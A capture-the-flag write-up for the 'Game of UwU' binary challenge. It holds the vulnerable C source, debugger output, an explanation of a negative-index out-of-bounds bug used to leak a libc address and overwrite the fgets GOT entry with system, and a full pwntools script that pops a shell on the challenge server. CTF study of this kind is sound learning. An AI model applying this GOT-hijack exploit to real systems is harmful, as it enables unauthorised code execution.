# Challenge description:
```
100 pts
Author: a1668k
Binary
Description
Solves 
2
Do you want to Play a game?? (❍ᴥ❍ʋ) Let play "Game of UwU"!

GameOfUwU[zip] 

nc chal.firebird.sh 35029

Since the server binary is unable to use gdb to debug because of system("clear"), the king of UwU is so nice that gives you a version for you to debug

GameOfUwU_noclear[file] 

At least, my solve script works on both version (つ´ω`)つ
```
# Source of program
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdbool.h>

const char UwU_NAME[6][16] = {"PiUwUchu" , "CharUwUder", "EvUwU", "UwUduck", "MagiUwU", "KING OF UwU"};
const char *Tips[6][2] = {
	{"--Tips of the day--", "  Do you know, if you try harder, you maybe able to solve the challenge!"},
	{"Today is a good day for hacking!", ""},
	{"--Tips of the day--", "  Do you know, the king of UwU is neither a boy nor girl!"},
	{"--Tips of the day--", "  Do you know, the author of this challenge is really nice!"},
	{"Remember don't wrench the authors!", "All authors are nice guy!"},
	{"--Tips of the day--", "  Do you know, the most dangerous place is the safest place!"}
};
char TEAM[6][16] = {"FirebUwU", "None", "None", "None", "None", "None"};
int TEAM_SIZE = 1;
int MAX_TEAM_SIZE = 6;
int CHOSEN = 1;
char encountered[16];

char buffer1[80];
char buffer2[80];

// Function Prototypes
void print_team();
void edit_nickname();
void play();
void meun();
void print_ui(char*, bool);
void battle_ui1(char*);
void battle_ui2(char*, char*);
void battle_ui3(char*);
void text_box_ui(char*, char*);
void run_away();

void print_team() {
	puts("+-------------------------------------------------------------------------------+");
	for (int i = 0; i < MAX_TEAM_SIZE; i++) {
		printf("| [*] %d: %-70s |\n", i+1, TEAM[i]);
	}
	puts("+-------------------------------------------------------------------------------+");
}

void edit_nickname() {
	int index;
	puts("+---MAIN MENU----------------------------------------------------------UwU------+");
	printf("  Whose nickname do you want to edit? (Please enter an index)\n  ");
	scanf("%d", &index);
	getchar();
	if (index <= TEAM_SIZE) {
		print_ui("menu", true);
		print_team();
		puts("+---MAIN MENU----------------------------------------------------------UwU------+");
		printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
		fgets(TEAM[index-1], 16, stdin);
		TEAM[index-1][strcspn(TEAM[index-1], "\n")] = 0;
	}
}

void play() {
	strcpy(encountered, UwU_NAME[rand() % 6]);
	print_ui("battle", true);
	printf("  1: Attack    2: UwUmon    3: UwUball    4. R̵͎̈ṵ̶͊n! \n  ");
	int option;
	scanf("%d", &option);
	getchar();
	switch (option) {
		case 1:
			// system("clear");
			print_ui("attack", false);
			break;
		case 2:
			// system("clear");
			battle_ui2(encountered, TEAM[CHOSEN-1]);
			print_team();
			puts("+----------------------------------------------------------------------UwU------+");
			printf("  Which one do you want to choose? (Please enter an index)\n  ");
			scanf("%d", &CHOSEN);
			if (CHOSEN > 6)
				CHOSEN = 1;

			// system("clear");
			run_away();
			sleep((rand() % 2) + 2);
			break;
		case 3:
			// system("clear");
			battle_ui2(encountered, TEAM[CHOSEN-1]);
			text_box_ui("Firebird used UwUball!", "");
			puts("+----------------------------------------------------------------------UwU------+");
			sleep((rand() % 2) + 1.5);
			if (rand() % 2) {
				if (TEAM_SIZE < 6) {
					// system("clear");
					battle_ui2(encountered, TEAM[CHOSEN-1]);
                    sprintf(buffer1, "Gotcha! %s was caught!", encountered);
					strcpy(buffer2, "");
                    text_box_ui(buffer1, buffer2);
					puts("+----------------------------------------------------------------------UwU------+");
					strcpy(TEAM[TEAM_SIZE], encountered);
					TEAM_SIZE++;
					sleep((rand() % 2) + 2);
				} else {
					// system("clear");
					battle_ui2(encountered, TEAM[CHOSEN-1]);
                    sprintf(buffer1, "Gotcha! %s was caught!", encountered);
                    sprintf(buffer2, "Your team is full! %s will be send to PC!", encountered);
                    text_box_ui(buffer1, buffer2);
					puts("+----------------------------------------------------------------------UwU------+");
					sleep((rand() % 2) + 2);
				}
			} else {
				// system("clear");
				battle_ui2(encountered, TEAM[CHOSEN-1]);
                sprintf(buffer1, "Oh no! %s has escaped!", encountered);
				strcpy(buffer2, "");
                text_box_ui(buffer1, buffer2);
				puts("+----------------------------------------------------------------------UwU------+");
				sleep((rand() % 2) + 2);

				// system("clear");
				run_away();
				sleep((rand() % 2) + 2);
			}
			break;

		default:
			// system("clear");
			battle_ui2(encountered, TEAM[CHOSEN-1]);
			text_box_ui("Ŷ̵̱o̵͓͋u̴̬̇ ̸͓̅c̶̪̒å̵̧n̶͍͌'̷͍͋t̶͕̿ ̷̩͛r̴̠͂u̴̺͝n̵̬̉", "");
			puts("+----------------------------------------------------------------------UwU------+");
			sleep((rand() % 2) + 2);

			// system("clear");
			run_away();
			sleep((rand() % 2) + 2);
	}
}

void meun() {
	bool print_team_flag = false;
	while (1) {
		print_ui("menu", true);
		if (print_team_flag) {
			print_team();
		} else {
			int random_number = (rand() % 6);
			strcpy(buffer1, Tips[random_number][0]);
			strcpy(buffer2, Tips[random_number][1]);
			text_box_ui(buffer1, buffer2);
		}
		print_team_flag = false;
		puts("+---MAIN MENU----------------------------------------------------------UwU------+");
		printf("  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ");
		int option;
		scanf("%d", &option); getchar();
		switch (option) {
			case 1:
				play();
				break;
			case 2:
				print_team_flag = true;
				break;
			case 3:
				print_ui("menu", true);
				print_team();
				edit_nickname();
				break;
			case 0:
				exit(0);
		}
	}
}

int main() {
	srand(time(NULL));
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);
	print_ui("start", true);
	getchar();
	meun();
	return 0;
}

void print_ui(char option[16], bool clear) {
	if (clear) {
		// system("clear");
	}
	if (strcmp(option, "start") == 0) {
        puts("+-------------------------------------------------------------------------------+");
        puts("|                                                                               |");
        puts("|   ________                                _____   ____ ___          ____ ___  |");
        puts("|  /  _____/_____    _____   ____     _____/ ____\\ |    |   \\__  _  _|    |   \\ |");
        puts("| /   \\  ___\\__  \\  /     \\_/ __ \\   /  _ \\   __\\  |    |   /\\ \\/ \\/ /    |   / |");
        puts("| \\    \\_\\  \\/ __ \\|  Y Y  \\  ___/  (  <_> )  |    |    |  /  \\     /|    |  /  |");
        puts("|  \\______  (____  /__|_|  /\\___  >  \\____/|__|    |______/    \\/\\_/ |______/   |");
        puts("|          \\/     \\/      \\/     \\/                                             |");
        puts("|                                                                               |");
        puts("|                                                                               |");
        puts("|                                                                               |");
        puts("|                                                                               |");
        puts("|                                                                               |");
        puts("|                                                                               |");
        puts("|                                                                               |");
        puts("+-------------------------------------------------------------------------------+");
        puts("+----------------------------------------------------------------------UwU------+");
        puts("Press any key to continue...");
    } else if (strcmp(option, "menu") == 0) {
        puts("+-------------------------------------------------------------------------------+");
        puts("|                                                         v        _(    )      |");
        puts("|                                                       v         (___(__)      |");
        puts("|                                                    v v                        |");
        puts("|        _ ^ _                                         v                        |");
        puts("|       '_\\V/ `                                v  v                             |");
        puts("|       ' oX`                                        v                          |");
        puts("|          X                                            v                       |");
        puts("|          X                                                                    |");
        puts("|          X                   +                                  .             |");
        puts("|          X     UwU           A_                                 |\\            |");
        puts("|          X.a#######a.       /\\-\\                                |_\\           |");
        puts("|       .aa##############a   _||\"|_                              __|__          |");
        puts("|    .a############################aa.                           \\   /          |");
        puts("|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|");
        puts("+-------------------------------------------------------------------------------+");
    } else if (strcmp(option, "battle") == 0) {
			battle_ui1(encountered);
            sprintf(buffer1, "Wlid %s appeared!", encountered);
            strcpy(buffer2, "");
            text_box_ui(buffer1, buffer2);
			puts("+----------------------------------------------------------------------UwU------+");
			sleep((rand() % 2) + 2);
			// system("clear");

			battle_ui1(encountered);
            sprintf(buffer1, "Go! %s!", TEAM[CHOSEN-1]);
            strcpy(buffer2, "");
            text_box_ui(buffer1, buffer2);
			puts("+----------------------------------------------------------------------UwU------+");
			sleep((rand() % 2) + 2);
			// system("clear");

			battle_ui2(encountered, TEAM[CHOSEN-1]);
            sprintf(buffer1, "What will %s do?", TEAM[CHOSEN-1]);
            strcpy(buffer2, "");
            text_box_ui(buffer1, buffer2);
			puts("+----------------------------------------------------------------------UwU------+");
    } else if (strcmp(option, "attack") == 0) {
			battle_ui2(encountered, TEAM[CHOSEN-1]);
            sprintf(buffer1, "%s used Try Harder!", TEAM[CHOSEN-1]);
            strcpy(buffer2, "");
            text_box_ui(buffer1, buffer2);
			puts("+----------------------------------------------------------------------UwU------+");
			sleep((rand() % 2) + 2);
			// system("clear");

			battle_ui2(encountered, TEAM[CHOSEN-1]);
			text_box_ui("But it failed!", "");
			puts("+----------------------------------------------------------------------UwU------+");
			sleep((rand() % 2) + 2);
			// system("clear");

			run_away();
			sleep((rand() % 2) + 2);
    }
}

void battle_ui1(char encounter[16]) {
	puts("+-------------------------------------------------------------------------------+");
	printf("| %-15s |                                                             |\n", encounter);
	puts("| Lvl: 1000       |                                              ,,,            |");
	puts("| HP: 100000      |                                             (UwU)           |");
	puts("|-----------------+                                     ----oOO--( )--OOo----   |");
	puts("|                                                                / \\            |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                             +-----------------|");
	puts("|                                                             |                 |");
	puts("|                                                             |                 |");
	puts("|                                                             |                 |");
	puts("+-------------------------------------------------------------------------------+");
}

void battle_ui2(char encounter[16], char team[16]) {
	puts("+-------------------------------------------------------------------------------+");
	printf("| %-15s |                                                             |\n", encounter);
	puts("| Lvl: 1000       |                                              ,,,            |");
	puts("| HP: 100000      |                                             (UwU)           |");
	puts("|-----------------+                                     ----oOO--( )--OOo----   |");
	puts("|                                                                / \\            |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|   +-------+                                                                   |");
	puts("|   | o   o |                                                 +-----------------|");
	printf("|   |  www  |                                                 | %-15s |\n", team);
	puts("|   +-------+                                                 | Lvl: 1          |");
	puts("|                                                             | HP: 10          |");
	puts("+-------------------------------------------------------------------------------+");
}

void battle_ui3(char team[16]) {
	puts("+-------------------------------------------------------------------------------+");
	puts("|                 |                                                             |");
	puts("|                 |                                                             |");
	puts("|                 |                                                             |");
	puts("|-----------------+                                                             |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|                                                                               |");
	puts("|   +-------+                                                                   |");
	puts("|   | o   o |                                                 +-----------------|");
	printf("|   |  www  |                                                 | %-15s |\n", team);
	puts("|   +-------+                                                 | Lvl: 1          |");
	puts("|                                                             | HP: 10          |");
	puts("+-------------------------------------------------------------------------------+");
}

void text_box_ui(char text1[77], char text2[77]) {
	puts("+-------------------------------------------------------------------------------+");
	printf("| %-77s |\n", text1);
	printf("| %-77s |\n", text2);
	puts("+-------------------------------------------------------------------------------+");
}

void run_away() {
	battle_ui3(TEAM[CHOSEN-1]);
    sprintf(buffer1, "%s ran away!", encountered);
    strcpy(buffer2, "");
    text_box_ui(buffer1, buffer2);
	puts("+----------------------------------------------------------------------UwU------+");
}

// This function is used to make sure the binary 
// work the same as the binary with "system(clear);"
void debug() {
	system("");
}
```
## Key observations 
function - `edit_nickname` is vulnerable 
```c
void edit_nickname() {
	int index;
	puts("+---MAIN MENU----------------------------------------------------------UwU------+");
	printf("  Whose nickname do you want to edit? (Please enter an index)\n  ");
	scanf("%d", &index);
	getchar();
	if (index <= TEAM_SIZE) {
		print_ui("menu", true);
		print_team();
		puts("+---MAIN MENU----------------------------------------------------------UwU------+");
		printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
		fgets(TEAM[index-1], 16, stdin);
		TEAM[index-1][strcspn(TEAM[index-1], "\n")] = 0;
	}
}
```
### Illegal memory accessing 
it is vulnerable because the `TEAM` array index checking condition does not check for negative indecies:  
```c
if (index <= TEAM_SIZE) {
```
this allows us to make use of negative indecies to access memory location we shouldn't have access to.

For example, if we enter `-1` as our index option, we get access a thing called `data_start` at the address `0x55555555a0c0` which is `0xffffffffffffffe0` away from `TEAM[0]` 

```
0x55555555543a <edit_nickname+154>    mov    rdx, rax                        RDX => 0xffffffffffffffe0
   0x55555555543d <edit_nickname+157>    lea    rax, [rip + 0x4c7c]             RAX => 0x55555555a0c0 (TEAM) ◂— 'FirebUwU'
   0x555555555444 <edit_nickname+164>    add    rax, rdx                        RAX => 0x55555555a0a0 (data_start) (0x55555555a0c0 + 0xffffffffffffffe0)
   0x555555555447 <edit_nickname+167>    mov    rsi, rax                        RSI => 0x55555555a0a0 (data_start) ◂— 0
```

Moreover, since each slots in the array `TEAM[6][16]` occupies 16 bytes, each increment or decrement in our index would lead to a memory address 16 bytes higher or lower than our previous slot.

For example:
`-1` : a0a0 ---> `data_start`

`-2` : a090 ---> `rand()`

By the way, we are now at `rand()` already!
```
RSI => 0x55555555a090 (rand@got[plt]) —▸ 0x7ffff7df6430 (rand) ◂— sub rsp, 8
```
Which means we are now at the of GOT entries to the libc functions 

```
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/Desktop/CTF/GameOfUwU/GameOfUwU_patched:
GOT protection: Partial RELRO | Found 16 GOT entries passing the filter
[0x556ad1d1c018] strcpy@GLIBC_2.2.5 -> 0x556ad1d17030 ◂— endbr64 
[0x556ad1d1c020] puts@GLIBC_2.2.5 -> 0x7f718ce80e50 ◂— endbr64 
[0x556ad1d1c028] system@GLIBC_2.2.5 -> 0x7f718ce50d70 ◂— endbr64 
[0x556ad1d1c030] printf@GLIBC_2.2.5 -> 0x556ad1d17060 ◂— endbr64 
[0x556ad1d1c038] strcspn@GLIBC_2.2.5 -> 0x556ad1d17070 ◂— endbr64 
[0x556ad1d1c040] srand@GLIBC_2.2.5 -> 0x7f718ce460a0 ◂— endbr64 
[0x556ad1d1c048] fgets@GLIBC_2.2.5 -> 0x556ad1d17090 ◂— endbr64 
[0x556ad1d1c050] strcmp@GLIBC_2.2.5 -> 0x7f718cf98940 ◂— endbr64 
[0x556ad1d1c058] getchar@GLIBC_2.2.5 -> 0x7f718ce87ae0 ◂— endbr64 
[0x556ad1d1c060] time@GLIBC_2.2.5 -> 0x7f718d136d90 (time) ◂— endbr64 
[0x556ad1d1c068] setvbuf@GLIBC_2.2.5 -> 0x7f718ce815f0 ◂— endbr64 
[0x556ad1d1c070] __isoc99_scanf@GLIBC_2.7 -> 0x556ad1d170e0 ◂— endbr64 
[0x556ad1d1c078] sprintf@GLIBC_2.2.5 -> 0x556ad1d170f0 ◂— endbr64 
[0x556ad1d1c080] exit@GLIBC_2.2.5 -> 0x556ad1d17100 ◂— endbr64 
[0x556ad1d1c088] sleep@GLIBC_2.2.5 -> 0x556ad1d17110 ◂— endbr64 
[0x556ad1d1c090] rand@GLIBC_2.2.5 -> 0x556ad1d17120 ◂— endbr64 
```
We go from `0x556ad1d1c090` using `-2` the highest address in this pack of functions to the lowest address `0x556ad1d1c018` which is `strcpy`. However `strcpy` cannot be accessed as we jump 16 bytes each time, and overwriting 8 bytes address with more than 8 bytes of content would just **overflow** to the higher address and not the lower one. 
The last libc function we can access via indexing, would be `puts` with index `-9`

### Content GOT leaked
```
+-------------------------------------------------------------------------------+
|                                                         v        _(    )      |
|                                                       v         (___(__)      |
|                                                    v v                        |
|        _ ^ _                                         v                        |
|       '_\V/ `                                v  v                             |
|       ' oX`                                        v                          |
|          X                                            v                       |
|          X                                                                    |
|          X                   +                                  .             |
|          X     UwU           A_                                 |\            |
|          X.a#######a.       /\-\                                |_\           |
|       .aa##############a   _||"|_                              __|__          |
|    .a############################aa.                           \   /          |
|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+-------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------+
| [*] 1: FirebUwU                                                               |
| [*] 2: None                                                                   |
| [*] 3: None                                                                   |
| [*] 4: None                                                                   |
| [*] 5: None                                                                   |
| [*] 6: None                                                                   |
+-------------------------------------------------------------------------------+
+---MAIN MENU----------------------------------------------------------UwU------+
  Please get a new name to FirebUwU! What is its new nickname? 
```
Above is the display of the beautiful game after we pick option `3` to edit pokemon nick names. 
Right before we rename any of the pokemon, the following message is printed 
```
Please get a new name to FirebUwU! What is its new nickname? 
```
where the original C course code is:

```c
printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
```

Here, `%s` deference the memory address at `TEAM[index-1]` and prints its content, which provides an excellent opportunity for us to leak an address.

For example, when `TEAM[index-1]` was the address of a GOT entry, the program just leaks the following address in this way:
```
Please get a new name to \x90-\xbf\xc0\xd9\x7f! What is its new nickname?
```
Then, what we do is to parse the leaked address with python, turn it to int and calculate the `system` address

### Hijacking GOT entry 
Now that we successfully leaked a memory address, we are going overwrite a libc function to `system` so that we can get a shell by passing in `/bin/sh` as 1st argument into the hijacked function.

The best choice is probably `fgets` because of the below observation
```c
printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
fgets(TEAM[index-1], 16, stdin);
```
I choose function according to the ease of overwriting, here we can easily overwrite with a pre-existing `TEAM[index-1]` value. That means if we rename `TEAM[index-1]` into `/bin/sh`, hijacked `fgets` into `system`, we would just get a shell. Renaming is easily, but how do we overwrite `fgets`?

### Overwriting addresses value 
```c
printf("  Please get a new name to %s! What is its new nickname? \n  ", TEAM[index-1]);
fgets(TEAM[index-1], 16, stdin);
```
Again with the above code, it allows us to change the content of a memory address with `fgets` it self. And with the fact that we are able to access GOT entry memory section as well as retriving the addresses by parsing them, we can easily get addresses of GOT entry, rewrite it or the adjacent addresses to `system`. As it allows us to write 16 bytes in total.  

Since we cannot get to `fgets` directly with integer indexing and the 16 bytes per indecies, per jump. Also, because overflow of bytes overwrites the higer addresses. Therefore, we are choosing to start from overwriting `srand`, which is right above (actually below in memory) `fgets`, with some random 8 bytes padding. Then the other 8 bytes of the 16 bytes would be our calculated address of `system`   

Below is before and after overwriting `srand` and `fgets`  
Before:  
```
```
After:
```
```

### Putting `/bin/sh` into `fgets` aka `system`

After we successfully hijacked `fgets` with `system`, it is now time to pass in `/bin/sh`.
The first step ( mentioned above), is to first rename one of the pokemon, here we choose the default one `FirebUwU` and rename it to `/bin/sh`. This step can be done any time before we choose to edit nickname after hijacking `fgets`. Because `fgets` would surely be called during the process of renaming, and we don't want any weird arguments being passed in. 

## Full solve script

```py
from pwn import * 
import time 
binary = ("./GameOfUwU_patched")

p = process(binary)
p = remote("chal.firebird.sh", 35029)
libc = ELF('./libc.so.6')

elf = ELF(binary)
s = 'b*edit_nickname+127'
#gdb.attach(p, s)
p.sendline(b'1') # press any key to continue

#context.log_level = 'debug'
# overwriting FireUwU

p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')

p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
p.sendline(b'1')
p.sendlineafter(b"What is its new nickname?", b'/bin/sh')


p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'-2')
p.recvuntil(b"  Please get a new name to ")

# parse the leaked address to int, hex and potentially further conver to other formats 
GOT_leak = int.from_bytes(p.recvuntil(b"!", drop = True), 'little')
libc.address = GOT_leak - libc.sym['rand'] # calculate the libc base
print(hex(GOT_leak)) # debugging 
print(hex(libc.address)) # debugging 
#print(hex(libc.sym['rand']))


# preserving the leaked address, for a second entry to overwrite fgets (success)
preserved = GOT_leak.to_bytes(6, 'little')
p.sendlineafter(b"What is its new nickname?", preserved)


system_addr = libc.sym['system'] # calculate the offset of system 
print(hex(system_addr)) # debugging 


# Going to overwrite fgets, overwrite is possible know by manual test 
p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'-7')
p.recvuntil(b"  Please get a new name to ")
payload = b'A' * 8 + system_addr.to_bytes(6, 'little') # index 6 to access srand and write downwards (up acutally)
p.sendlineafter(b"What is its new nickname?", payload)




# pass /bin/sh into fgets!!, commented to pass in manually kk4
time.sleep(0.5)
p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
time.sleep(0.5)
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'1')
time.sleep(0.5)
p.sendlineafter(b"What is its new nickname?", b'/bin/sh')


p.interactive()



#print(hex(libc.address))
#print(hex(libc.sym['rand']))
```